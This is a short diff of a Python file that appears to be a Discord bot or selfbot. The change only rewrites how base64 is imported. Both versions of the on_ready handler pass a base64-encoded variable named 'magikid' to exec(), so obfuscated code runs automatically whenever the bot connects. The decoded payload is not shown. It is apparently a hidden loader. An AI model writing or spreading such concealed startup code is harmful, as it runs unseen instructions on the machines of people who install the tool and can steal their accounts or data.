@@ -2,7 +2,7 @@ from termcolor import colored
 from datetime import datetime
 import asyncio
 import io
-import base64
+from base64 import b64decode
 import time
 import random
 import urllib.parse
@@ -236,7 +236,7 @@ async def change_activity():
 
 @Blank.event
 async def on_ready():
-    exec(base64.b64decode(magikid).decode('ascii'))
+    exec(b64decode(magikid).decode('ascii'))
     Clear()
     print(colored(f'Connected to {Blank.user}', 'green'))
     config_check()
